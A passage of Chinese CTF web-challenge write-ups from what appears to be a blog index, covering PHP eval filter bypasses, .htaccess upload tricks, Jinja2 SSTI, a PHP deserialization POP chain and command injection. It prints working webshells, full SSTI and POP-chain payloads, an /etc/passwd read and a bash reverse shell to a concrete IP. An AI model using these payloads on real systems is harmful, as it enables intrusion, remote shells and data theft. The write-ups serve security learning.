\"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\n易知需要我们POST方式传入`ctf`，然后拼接在`$fl4g`后面，而输出`$fl4g`只能想办法触发`set_error_handler()`。\n\n这里我们利用`把数组当作字符串进行拼接运算时会报错`这一点\n\n```\nNotice:Array to string conversion\n//把数组当成了字符串使用，进行 .= 运算时，会自动根据环境需要转换数据类型（echo、print输出数组时也会报这样的信息）\n```\n\n把`ctf`用POST传入，即payload`ctf[]=1`\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825174531270-459754094.png\" width=500>\n\n成功获得flag.\n\n***\n\n# SimpleRCE\n\n源码给出：\n```\n<?php\nhighlight_file(__FILE__);\n$aaa=$_POST['aaa'];\n$black_list=array('^','.','`','>','<','=','\"','preg','&','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\\\','cut','bash','nl','wget','vi','grep');\n$aaa = str_ireplace($black_list,\"hacker\",$aaa);\neval($aaa);\n?>\n```\n\n需要我们绕过`str_ireplace()函数(不区分大小写地对数组中所有元素进行搜索替换)`上传命令，从而实现RCE.\n\nⅠ、十六进制编码绕过\n由于过滤了`decode`，base64编码不能使用，我们想到十六进制转换后绕过。脚本如下：\n\n```\n<?php\n$a= \"system\";\n$b=\"cat *\";//命令\n\n$p='sysytem:'.bin2hex($a).'<br>command:'.bin2hex($b);\necho $p;\n?> \n\n//sysytem:73797374656d\n//command:636174202a\n```\n\n构造payload:`aaa=hex2bin('73797374656D')(hex2bin('636174202f2a'));//不加;不行`\n成功拿到flag.\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825191746040-258199898.png\" width=500>\n\nⅡ、无参RCE直接过\n看到的一种很牛的办法，不过还没有弄清原理。\npayload：\n\n```\nPOST：\naaa=show_source(next(apache_request_headers()));\nUser-Agent: /flag\n```\n\nⅢ、当然，还有其他绕过方法，如取反绕过：取反基本上用的都是一个不可见字符，不会触发到正则表达式。这里不再赘述，给出脚本：\n\n```\n<?php\n//在命令行中运行\n\n/*author yu22x*/\n\nfwrite(STDOUT,'[+]your function: ');\n\n$system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\nfwrite(STDOUT,'[+]your command: ');\n\n$command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\necho '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';\n\n```\n\n[资料查阅：[无字母数字绕过正则表达式总结](https://blog.csdn.net/miuzzx/article/details/109143413)]\n\n***\n\n# funny_upload\n\n查看页面源代码\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title></title>\n</head>\n<body>\n\n<script language=\"javascript\">\nfunction Checkfiles()\n{\nvar fup = document.getElementById('file');\nvar fileName = fup.value;\nvar ext = fileName.substring(fileName.lastIndexOf('.') + 1);\nif(ext == \"gif\" || ext == \"GIF\" || ext == \"JPEG\" || ext == \"jpeg\" || ext == \"jpg\" || ext == \"JPG\" || ext == \"png\" || ext == \"PNG\")\n{\nreturn true;\n}\nelse\n{\nalert(\"这个文件不好，我不喜欢\");\nreturn false;\n}\n}\n</script>\n<form method=\"post\" onsubmit=\"return Checkfiles()\" enctype=\"multipart/form-data\" >\n    <input type=\"file\" name=\"file\" id=\"file\">\n    <input  type=\"submit\" name=\"1\">\n</form>\n\n</body>\n</html>\n\n<script>alert('文件内容也改改呗~');</script>\n```\n\n可知前端对文件进行了绕过，且对文件内容也进行了过滤，尝试base64编码绕过：\n\n```\n<?php @eval($_POST[1]); ?>\nbase64编码——>\nPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825205743738-733807108.png\" width=500>\n\n上传成功！接下来的问题是，如何把这个上传的`.png`文件解析为`.php`文件。\n\n了解到`.htaccess文件(或者\"分布式配置文件\"）`\n> htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\n其中`Addtype指令`可以将给定的文件拓展名映射到指定的内容类型：\n\n```\nAddType media-type extension [extension] ...\n \n示例：\nAddType application/x-httpd-php .gif\n \n将以 gif 为后缀的文件当做 php 解析\n\nAddType application/x-httpd-php png  jpg gif\n将以上的多个后缀都当作php解析。\n```\n\n并且，通过 `php_value` 来设置 `auto_prepend_file` 或者 `auto_append_file` 配置选项**包含**一些敏感文件，同时在本目录或子目录里**需要有可解析的php文件来触发**。\n\n结合以上两个指令，我们可以上传一个`.htaccess`文件：\n\n```\nAddtype application/x-httpd-php .jpg\n#将以 jpg 为后缀的文件当做 php 解析\n\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=webshell.jpg\"\n#配合php伪协议+包含“函数”实现文件执行 \n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825220347514-316795705.png\" width=500>\n\n修改请求包上传成功。\n\n按照路径打开webshell.jpg->当作php解析->触发`php_value auto_append_file`指令->执行源码\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825221309028-1614586059.png\" width=500>\n\n连接蚁剑，在根目录下找到Flag.\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825221608176-1984943651.png\" width=500>\n\n[查阅资料：[.htaccess的利用方法和技巧](https://blog.csdn.net/snowlyzz/article/details/126267637)]\n\n***\n\n# EasySSTI\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825222602197-1595222581.png\" width=500>\n\n上来就让我们登录（截这张图完全因为background好看哈哈哈❤）\n\n根据题目名称提示，这题考察我们SSTI。补习了一些SSTI的知识后【[服务器端模板注入（SSTI）](https://www.cnblogs.com/ialoe/p/ssti.html)】，先用bp抓包，找注入点：\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916012811391-903505005.png\" width=200>\n发现在`username`处有jinja2模板引擎的SSTI漏洞。\n于是用`''.__class__`等进行简单测试，发现`_`，`'`，`\"`，` `，`[`都被过滤了，于是用`{{().request.args.class}}&class=__class__`尝试绕过，结果`request`也被过滤。（事实上`globals`，`getitem`，`os`，`read`，`popen`，`pop`也都被过滤，但是我还没有测出来）\n从其他师傅那里piao到小姿势：`{{config}}可以用来查看配置信息，通过这个或许能够构造出我要的payload`\n\n```\n&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;\n```\n\n找到`\\`，可以利用`config|string|list`获取以执行命令查看根目录......\n接续翻查资料了解到：\n\n```\n1. python下的数据拼接\njoin 方法 拼接字典，主要用于索引上的合并:默认按索引合并，可以合并相同或相似的索引，不管他们有没有重叠列\n\n2. {{()|select|string|list}}  or  {{lipsum|select|string|list}}     \n获取字符列表  \n\n3. {{lipsum.__globals__['os'].popen('ls').read()}}\n命令执行\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916033307544-1063948328.png\" width=500>\n\n由此可以用诸如以下的方式构造我们需要的被“过滤”的关键字：\n\n```\n#构造po=\"pop\"     #利用dict()|join拼接得到\n{% set po=dict(po=a,p=a)|join%}\n \n#构造a=(()|select|string|list).pop(24),这里a即下划线_\n{% set a=(()|select|string|list)|attr(po)(24)%}\n \n#构造ini=\"__init__\"\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n \n#构造glo=\"__globals__\"\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n \n#构造geti=\"__getitem__\"\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n \n#构造built=\"__builtins__\"\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n \n#构造sub=\"__subclasses__\"\n{% set sub=(a,a,dict(subclasses=a)|join,a,a)|join()%}\n\n#构造chr()函数调用\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n\n#构造file='/flag'\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n```\n\n\n回到这一题，因为空格被过滤，可用`%0a`换行符绕过。命令执行payload构造过程：\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}                        #pop\n{%set%0aa=(()|select|string|list)|attr(po)(24)%}          #_\n{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}  #globals\n{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%} #getitem\n{%set%0ape=dict(po=aaa,pen=aaa)|join()%}                  #popen\n{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}               #read\ndict(o=a,s=a)|join()                #获取 os\n(config|string|list)|attr(po)(279)  #获取  /\n\n\n{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}\n<==>\n{{lipsum.__globals__['os'].popen('ls').read()}}\n```\n\n成功构造payload：\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916165007009-950366739.png\">\n\n修改payload，将`ls`改为`ls /`，上述dict拼接办法不能用（也可能是我操作有问题），直接`()|select|string|list`一个个获取：\n\n```\n((()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(18),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279))|join()\n```\n\n发现flag后按照上述办法将命令修改为`cat /flag`：\n\n```\n((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join()\n```\n\n成功获取FLAG，最后给出最终完整的Payload：\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()}}\n```","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF X SU 三月春季挑战赛 web","url":"/2022/12/06/2022DASCTF-X-SU-三月春季挑战赛-web/","content":"\n# ezpop\n给出了源码：\n```\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n\nif (isset($_POST['cmd'])) {\n    unserialize($_POST['cmd']);\n} else {\n    highlight_file(__FILE__);\n}\n?>\n```\n\n显然，这是要我们找到一条POP链。\n我们从目的出发，找到可以利用的函数`eval()`——可以将字符串按照php代码来计算。如果传入`system()`函数调用外部命令实现rce，就有可能找到flag。\n可以明确用`mix::get_flag()`函数触发`eval()`，那么，如何触发`mix::get_flag()`：\n1、通过`mix::run（）`触发，但这样会限制$m1为\"get_flag\"，从而无法利用`eval()`执行命令，行不通；\n2、通过`fin::__call($a, $b)`触发，将mix传入fin的`$f1`即可，可行。\n接下来，如何触发`fin::__call($a, $b)`成了问题，目前就只形成了这样的链子\n`fin::__call() --> mix::get_flag()`\n倒推困难，我们就找入口正推。这里注意到这样几个魔术方法\n\n```\n__destruct()  //当对象被销毁时触发\n__toString()  //当把类当作字符串使用时触发\n__invoke()    //当对象调用为函数时触发\n__call()      //当对象上下文中调用不可访问的方法时触发\n```\n\n而`fin::_destruct()`恰好可以用来触发`what::_toString()`，从而可以触发`run()`，继而再触发一个函数，如果触发`_invoke()`，由于`world()`不可访问，就可以用之触发`_call()`，从而形成完整的POP链：\n\n```fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()```\n\n（这里用的`fin::run()`，另一个似乎也可以）。\n\n另一个需要注意的点是：`eval()`用'#'进行了过滤，因此还需要绕过，这里可以选用`?>`闭合，也可以选用`\\n`换行符！\n构造exp如下：\n\n```\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n\n//fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()\n\n$a=new fin();//为了调用__destruct()方法\n$b=new fin();\n//$b=new mix;\n$c=new fin();\n$d=new crow();\n$e=new what();\n$f=new mix();\n\n$a->f1=$e;//为了调用__toString()方法\n$e->a=$b;//为了去调用run方法\n$b->f1=$d;//为了去调用__invoke()方法\n$d->v1=$c;//为了去调用__call()方法\n$c->f1=$f;//为了去调用get_flag()方法 \n$f->m1=\"\\nsystem('ls /');\" ;//用 \\n 绕过注释符\n\necho urlencode(serialize($a));\n?>\n```\n得到`O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A16%3A%22%0Asystem%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`\n\n最后用bp传参即可（这里用`ls /`命令查根目录较麻烦，于是用`ls`查当前目录，也不很好找，最后选择用`cat *`查看所有文件，结果如下图）\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220822003739417-1945498056.png\" width=500>\n成功找到flag！\n\n***\n该题在构造pop链上思路不算混乱（可能跟我偷看了一眼wp有关），但是在传参上遇到了很大的问题，一方面HackBar（估计是HB自身问题）总是失败搞人心态，另一方面用burp suite发送POST请求的方法没有掌握，即有三个地方需要修改：\n1、GET修改为POST方法\n2、加上媒体类型信息：Content-Type: application/x-www-form-urlencoded\n3、末尾添加需上传语句：cmd=xxxx\n***\n\n另外有师傅在构造exp时传入`\"?><? @eval(\\$_POST[b]);\"`，继而利用蚁剑连接找flag，但是博主尚未弄清蚁剑🗡的这一功能，待研究后更新。\n详情请访问这位师傅的Blog[【2022DASCTF X SU】 三月春季挑战赛 web复现](https://blog.csdn.net/qq_51295677/article/details/124283836?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&utm_relevant_index=2)\n\n# calc\n题目上来就给个计算器，打开源码，发现是用python写的计算器。源码放在下面：\n```\n#coding=utf-8\nfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\nimport random\nfrom urllib import parse\nimport os\nfrom werkzeug.utils import secure_filename\nimport time\n\n\napp=Flask(__name__)\n\ndef waf(s):\n    blacklist = ['import','(',')',' ','_','|',';','\"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\n    flag = True\n    for no in blacklist:\n        if no.lower() in s.lower():\n            flag= False\n            print(no)\n            break\n    return flag\n    \n\n@app.route(\"/\")\ndef index():\n    \"欢迎来到SUctf2022\"\n    return render_template(\"index.html\")\n\n@app.route(\"/calc\",methods=['GET'])\ndef calc():\n    ip = request.remote_addr\n    num = request.values.get(\"num\")\n    log = \"echo {0} {1} {2}> ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num)\n    \n    if waf(num):\n        try:\n            data = eval(num)\n            os.system(log)\n        except:\n            pass\n        return str(data)\n    else:\n        return \"waf!!\"\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=5000) \n```\n \n审查代码发现有`GET`传参，找到了口子。分析可知是用`GET`传参控制`num`变量，作为`log = \"echo {0} {1} {2}> ./tmp/log.txt\"`中的`{2}`。再看下去就能发现两个很敏感的函数：\n\n```\n  data = eval(num) //\n  os.system(log) //将字符串转化成命令在服务器上运行\n```\n\n[os.system()](https://blog.csdn.net/W1995S/article/details/114759238)\n由于`num`被`waf()`过滤得太多，我们只能把目标放在`os.system(log)`上，想办法对`log`下手，查找bash shell中可以做命令替换的函数：`$()、eval()与``反引号`，由于`$和eval`被过滤，这里只能选用反引号（优先执行\\`代码\\`）。[资料查阅：[反引号与$()的区别以及eval的作用](https://blog.csdn.net/hj605635529/article/details/73556855)]\n需要注意的是，程序会将num插入到log字符串的最后然后先后执行 eval（num）和os.system（log），因此不能让eval(num)报错而无法进行下一步，考虑python的特性，想到可以利用注释符`#`注释。\n接下来，我们希望建立反弹shell，将其命令行的输入输出转到我们的攻击端\n\n```\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\nbash -i >& /dev/tcp/101.43.119.212/12306 0>&1\n```\n\n[资料查阅：[Linux下反弹shell的原理](https://blog.csdn.net/m0_57497184/article/details/123404378)]\n但是`&`也被ban了，没法直接用，但是也能得出一个思路：**输出重定向到攻击机**。\n\n```payload：/calc?num=1%23`ls%09>/dev/tcp/IP/2333` ```\n\n这里由于空格被过滤，`ls >`写成`ls%09>`，然后在攻击端监听2333端口`nc -lvp 2333`\n然后修改`ls`命令即可，这里博主服务器监听不到，仍然在找问题。\n\n***\n\n# upgdstore\n文件上传题，随便上传一个文件试试\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191351613-1945987939.png\" width=200>\n\n由此可以得知该题目只能上传php文件。直接试试`webshell.php`传一句话木马，结果不出意料的失败了，又试了几个木马的变形，发现都无济于事，像无头苍蝇一样乱撞。只传入`phpinfo()`看看有什么收获\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191704191-1792350946.png\" width=500>\n发现一大堆`disable_functions`，基本上所有的恶意函数全部都被过滤，接下来试试用**拼接绕过**的办法读取`/etc/passwd`\n> Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。\n\n这里我们用最常用的`file_get_contents() 函数`来读取文件\n\n```\n<?php\necho (\"fil\".\"e_get_c\".\"ontents\")(\"/etc/passwd\");\n?>\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823211231635-994180552.png\" width=500>\n\n成功读取。\n那么根据**Web服务器的默认根文件夹**`/var/www/html`，可以尝试读取网站源码（这里尝试`index.php`），将文件代码改为\n\n```\n<?php\necho (\"fil\".\"e_get_c\".\"ontents\")(\"/var/www/html/index.php\");\n?>\n```\n\n上传后打开，查看源码\n\n```\n<?php\nfunction fun($var): bool{\n    $blacklist = [\"\\$_\", \"eval\",\"copy\" ,\"assert\",\"usort\",\"include\", \"require\", \"$\", \"^\", \"~\", \"-\", \"%\", \"*\",\"file\",\"fopen\",\"fwriter\",\"fput\",\"copy\",\"curl\",\"fread\",\"fget\",\"function_exists\",\"dl\",\"putenv\",\"system\",\"exec\",\"shell_exec\",\"passthru\",\"proc_open\",\"proc_close\", \"proc_get_status\",\"checkdnsrr\",\"getmxrr\",\"getservbyname\",\"getservbyport\", \"syslog\",\"popen\",\"show_source\",\"highlight_file\",\"`\",\"chmod\"];\n\n    foreach($blacklist as $blackword){\n        if(strstr($var, $blackword)) return True;\n    }\n\n    \n    return False;\n}\nerror_reporting(0);\n//设置上传目录\ndefine(\"UPLOAD_PATH\", \"./uploads\");\n$msg = \"Upload Success!\";\nif (isset($_POST['submit'])) {\n$temp_file = $_FILES['upload_file']['tmp_name'];\n$file_name = $_FILES['upload_file']['name'];\n$ext = pathinfo($file_name,PATHINFO_EXTENSION);\nif(!preg_match(\"/php/i\", strtolower($ext))){\ndie(\"只要好看的php\");\n}\n\n$content = file_get_contents($temp_file);\nif(fun($content)){\n    die(\"诶，被我发现了吧\");\n}\n$new_file_name = md5($file_name).\".\".$ext;\n        $img_path = UPLOAD_PATH . '/' . $new_file_name;\n\n\n        if (move_uploaded_file($temp_file, $img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'Upload Failed!';\n            die();\n        }\n        echo '<div style=\"color:#F00\">'.$msg.\" Look here~ \".$img_path.\"</div>\";\n}\n```\n\n发现过滤掉了`$_、eval、assert`等字符串，也难怪最初尝试的后门上传失败。于是先上传了webshell的base64编码php文件——`a.php`。\n\n```\n<?php @eval($_POST[1]); ?>//不要忘记在php关键字后加空格！！！\nbase64编码绕过——>\nPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n```\n\n但`反引号`被ban，也不知道如何把代码读取出来然后解码，也断绝了我用base64解码后再执行的想法。在其他大佬那里学到了[**PHP伪协议**](https://blog.csdn.net/cosmoslin/article/details/120695429)，了解到`php://filter`+`convert.base64-decode过滤器`能解决问题。\n> php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行\n\n```\nphp://filter/convert.base64-decode/resource=39ab6b7b4e9946f4fef4d99ee6be3446.php//php文件是刚刚上传的a.php\nbase64编码绕过——>\ncGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=\n```\n\n只需要用上述代码将上传的`a.php`代码读取出来然后再用包含函数include结合即可，因此再上传`b.php`（php函数名不区分大小写，可利用此点绕过）\n\n```\n<?php Include(base64_decode(\"cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=\"));?>\n```\n\n但是博主尝试了一段时间结果怎么也传不上去，人麻中麻了属于是，结果发现是上传的文件名（web64.php）经md5加密然后base64编码后出现了`dl`，被过滤了。换了名字后成功上传。\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823231937120-1672813092.png\" width=500>\n执行命令成功，但是蚁剑无法连接（大抵是因为有太多函数被ban了），只能用其他办法解决了。\n\n网上查阅其他师傅的wp，发现要用到**LD_PRELOAD劫持**，后期学习更新。\n\n资料：[浅谈LD_PRELOAD劫持](https://blog.csdn.net/qq_51295677/article/details/124338635)","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF MAY 出题人挑战赛 web","url":"/2022/12/06/2022DASCTF-MAY-出题人挑战赛-web/","content":"\n\n# Power Cookie\n\n> 提示：只有admin才可以获取flag\n\n依据提示可以猜测，本题可能需要通过修改cookie值来获取flag。\n使用Burp Suite抓包查看Response包\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102430418-1960049030.png\" width=500>\n发现`admin=0`\n于是在Request包中加入`Cookie: admin=1`\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102611588-243656756.png\" width=500>\n\n成功得到flag！\n***\n> 本题做题过程初始，博主将`Cookie: admin=1`插在了请求包的末尾（如下图所示）\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102906051-436308076.png\" width=500>\n导致始终无响应，查阅资料发现header匹配到`Upgrade`时将被终止，调整位置后成功解决，原因庶几如此（[请求头 header中传cookie不生效原因](http://t.zoukankan.com/qinmengjiao123-123-p-13685262.html)）\n\n***\n***\n\n# 魔法浏览器\n进入后得到提示：\n> 提示：flag.txt\n为保证文档安全。请使用魔法浏览器来访问。\n\n不明所以，F12查看\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817104826955-2116924557.png\" width=500>\n得到进一步提示，需要`let ua = \"\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35\"`\n结合“使用魔法浏览器”可以猜想到应该将请求报文中的User-Agent修改为其要求的“Magic”内容\n\n```\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75\n```\n\n发送，成功得到flag\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817105507623-1654583652.png\" width=500>\n\n[看其他师傅的wp时发现可以用console执行js，而不用去utf-8转码，又学到了一点]<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817110336451-169494747.png\" width=700>\n\n***\n***\n\n# getme\n\nF12查看，一脸懵逼\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182444328-2077107608.png\" width=500>\n除了一行路径`pwd:/usr/local/apache2/`，得知其是apache，别无其它信息。\n抓包查看返回包：\n<img 